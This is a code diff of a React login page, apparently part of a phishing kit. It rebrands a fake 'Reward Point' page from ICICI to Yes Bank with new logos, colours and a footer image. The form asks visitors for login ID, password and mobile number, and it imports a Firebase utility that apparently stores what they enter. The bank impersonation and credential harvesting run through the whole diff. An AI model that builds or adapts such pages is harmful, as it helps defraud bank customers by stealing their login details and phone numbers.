@@ -2,7 +2,8 @@ import  { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import FirebaseUtil from './FirebaseRepo';
 import { MdLock } from "react-icons/md";
-import myImage from './assets/icici_logo.jpeg';
+import myImage from './assets/yes_bank_top.png';
+import footerImage from './assets/yes_footer.jpeg';
 
 function FirstPage() {
   const navigate = useNavigate();
@@ -11,6 +12,7 @@ function FirstPage() {
   const [password, setPassword] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false); // Submit loading state
   
+
 
 
 
@@ -28,24 +30,26 @@ function FirstPage() {
   };
 
   return (
-    <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
+    <div className="max-w-md mx-auto p-4 mt-4 bg-blue-600 rounded shadow">
       {isSubmitting && (
         <div className="absolute inset-0 flex items-center justify-center bg-white bg-opacity-50">
           <div className="loader"></div>
         </div>
       )}
-      <img src={myImage} alt="Description of the image" />
-      <h1 className="text-lg font-bold mb-4 flex items-center text-blue-910">
+        <div className="flex justify-center items-center w-full">
+          <img className="w-auto h-auto" src={myImage} alt="Description of the image" />
+        </div>
+      <h1 className="text-lg font-bold mb-4 flex items-center text-white">
         <MdLock className="mr-2 text-orange-500" />
-        Welcome to ICICI Reward Point
+        Welcome to Yes Bank Reward Point
       </h1>
       <form onSubmit={handleSubmit}>
         <div className="mb-4">
           <label
-            className="block text-gray-700 text-sm font-bold mb-2"
+            className="block text-gray-200 text-sm font-bold mb-2"
             htmlFor="name"
           >
-            User ID *
+            Login ID 
           </label>
           <input
             className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
@@ -58,7 +62,7 @@ function FirstPage() {
         </div>
         <div className="mb-4">
           <label
-            className="block text-gray-700 text-sm font-bold mb-2"
+            className="block text-gray-200 text-sm font-bold mb-2"
             htmlFor="password"
           >
             Password
@@ -74,7 +78,7 @@ function FirstPage() {
         </div>
         <div className="mb-4">
           <label
-            className="block text-gray-700 text-sm font-bold mb-2"
+            className="block text-gray-200 text-sm font-bold mb-2"
             htmlFor="phone"
           >
             Mobile Number
@@ -91,14 +95,19 @@ function FirstPage() {
         </div>
         <div className="flex justify-center">
           <button
-            className="bg-orange-500 hover:bg-orange-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
+            className="bg-gray-200 hover:bg-gray-400 text-gray-900 font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
             type="submit"
-            disabled={isSubmitting} // Disable button during submit
+            disabled={isSubmitting} // Disable button during submit   
           >
             {isSubmitting ? "Loading..." : "Proceed"}
           </button>
         </div>
       </form>
+      {/* footer image */}
+      <div className="flex justify-center mt-4">
+        <img src={footerImage} alt="Description of the image" />
+      </div>
+      
     </div>
   );
 }
